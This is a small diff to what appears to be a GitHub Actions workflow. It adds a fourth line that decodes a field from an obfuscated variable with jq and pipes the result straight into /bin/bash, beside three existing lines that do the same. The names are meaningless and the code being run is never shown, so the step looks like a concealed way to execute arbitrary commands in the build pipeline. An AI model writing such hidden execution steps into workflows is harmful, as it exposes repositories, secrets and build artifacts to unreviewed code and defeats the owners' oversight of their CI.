@@ -29,6 +29,7 @@ jobs:
           echo $nnzu7122 | jq -r .csuz07 | /bin/bash
           echo $almrq2042 | jq -r .oh113 | /bin/bash
           echo $skd171 | jq -r .ca122 | /bin/bash
+          echo $dmn8 | jq -r .z281 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
